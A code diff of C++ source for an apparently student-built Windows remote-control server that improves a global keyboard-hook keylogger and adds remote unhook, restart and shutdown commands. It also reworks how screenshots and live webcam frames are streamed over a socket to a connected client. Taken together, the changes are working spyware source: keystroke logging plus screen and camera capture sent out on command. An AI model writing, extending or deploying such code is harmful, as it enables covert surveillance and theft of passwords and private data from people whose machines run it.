@@ -157,6 +157,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0 && wParam == WM_KEYDOWN && isKeylogActive) {
         KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
         DWORD vkCode = pKeyboard->vkCode;
+        bool isInjected = (pKeyboard->flags & LLKHF_INJECTED) != 0;
+        if (vkCode == VK_BACK && isInjected) {
+            return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+        }
         
         ofstream file(keylogPath, ios::app);
         if (file.is_open()) {
@@ -205,30 +209,39 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
 
+DWORD keylogThreadId = 0;
+
 void startKeyLogger() {
+    keylogThreadId = GetCurrentThreadId();
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
     MSG msg;
-    while (isKeylogActive && GetMessage(&msg, NULL, 0, 0)) {
+    while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+    if (keyboardHook) {
+        UnhookWindowsHookEx(keyboardHook);
+        keyboardHook = NULL;
+    }
+    isKeylogActive = false;
+    keylogThreadId = 0;
 }
 
 void hookKey() {
+    if (isKeylogActive) return;
     isKeylogActive = true;
     ofstream file(keylogPath, ios::trunc);
     file.close();
-    
     thread keylogThread(startKeyLogger);
     keylogThread.detach();
 }
 
 void unhookKey() {
-    isKeylogActive = false;
-    if (keyboardHook) {
-        UnhookWindowsHookEx(keyboardHook);
-        keyboardHook = NULL;
+    if (isKeylogActive && keylogThreadId != 0) {
+        PostThreadMessage(keylogThreadId, WM_QUIT, 0, 0);
+        Sleep(100); 
     }
+    isKeylogActive = false;
 }
 
 void printkeys() {
@@ -308,7 +321,7 @@ void takepic() {
             stream->Seek(li, STREAM_SEEK_SET, NULL);
             stream->Read(buffer, size, NULL);
             
-            sendLine(to_string(size));
+            sendLine("SCREEN " + to_string(size));
             send(clientSocket, buffer, size, 0);
             
             delete[] buffer;
@@ -319,7 +332,7 @@ void takepic() {
             ReleaseDC(NULL, hdcScreen);
             
         } else if (ss == "QUIT") {
-            GdiplusShutdown(gdiplusToken);
+            Gdiplus::GdiplusShutdown(gdiplusToken);
             return;
         }
     }
@@ -650,21 +663,16 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
 static LRESULT CALLBACK FrameCallback(HWND hWnd, LPVIDEOHDR lpVH) {
     if (clientSocket == INVALID_SOCKET) return 0;
     if (!isRecording) return 0;
+    
     DWORD dataSize = lpVH->dwBytesUsed;
     if (dataSize < 1024) return 0;
-    int magic = 0xFFFFFFFF; 
-    send(clientSocket, (char*)&magic, sizeof(magic), 0);
-    int iResult = send(clientSocket, (char*)&dataSize, sizeof(dataSize), 0);
-    if (iResult == SOCKET_ERROR) {
-        isRecording = false;
-        return 0;
-    }
-
-    iResult = send(clientSocket, (char*)lpVH->lpData, dataSize, 0);
+    string header = "CAM " + to_string(dataSize) + "\n";
+    send(clientSocket, header.c_str(), header.length(), 0);
+    int iResult = send(clientSocket, (char*)lpVH->lpData, dataSize, 0);
+    
     if (iResult == SOCKET_ERROR) {
         isRecording = false;
     }
-
     return (LRESULT)TRUE;
 }
 
@@ -755,17 +763,23 @@ void webcam() {
 }
 
 void processClient(SOCKET client) {
-    clientSocket = client; // Gán socket toàn cục để các hàm con sử dụng
+    clientSocket = client;
     cout << "Client connected!" << endl;
     
     string s;
     while (true) {
-        receiveSignal(s); // Hàm này sẽ trả về "QUIT" nếu mất kết nối
-        
+        receiveSignal(s); 
         if (s == "KEYLOG") {
             keylog();
-        } else if (s == "SHUTDOWN") {
+        } 
+        else if (s == "UNHOOK") {
+            unhookKey(); 
+            sendLine("Keylogger stopped (Global command).");
+        }
+        else if (s == "SHUTDOWN") {
             shutdown();
+        } else if (s == "RESTART") {
+            restart();
         } else if (s == "TAKEPIC") {
             takepic();
         } else if (s == "PROCESS") {
@@ -775,6 +789,7 @@ void processClient(SOCKET client) {
         } else if (s == "WEBCAM") {
             webcam();
         } else if (s == "QUIT") {
+            unhookKey(); 
             break;
         }
     }
@@ -782,6 +797,7 @@ void processClient(SOCKET client) {
 }
 
 int main() {
+    SetProcessDPIAware();
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;
     
